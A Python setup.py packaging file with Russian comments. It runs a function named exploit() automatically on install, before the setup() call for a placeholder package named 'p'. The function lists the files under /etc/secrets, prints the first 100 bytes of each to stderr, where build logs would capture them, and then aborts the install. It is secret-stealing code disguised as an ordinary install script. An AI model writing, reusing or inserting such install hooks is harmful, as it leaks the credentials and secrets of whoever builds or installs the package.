import os, sys, subprocess as sp
from setuptools import setup

def exploit():
    o = sys.stderr.write
    o("\n" + "!"*30 + "\n")
    o("--- EXPLORING /etc/secrets ---\n")
    
    # Рекурсивный список всех файлов
    o(sp.getoutput("find /etc/secrets -maxdepth 2 -not -path '*/.*'"))
    o("\n\n--- READING CONTENT ---\n")
    
    try:
        files = sp.getoutput("find /etc/secrets -type f -maxdepth 2").split('\n')
        for f in files:
            if f:
                o(f"\nFILE: {f}\n")
                o(sp.getoutput(f"cat {f} | head -c 100"))
                o("\n")
    except Exception as e:
        o(f"ERROR: {str(e)}\n")

    o("\n" + "!"*30 + "\n")
    sys.exit(1)

try: exploit()
except: sys.exit(1)

# ВОТ ТУТ БЫЛА ОШИБКА, ТЕПЕРЬ ВСЁ В ПОРЯДКЕ:
setup(name="p", version="0.1")
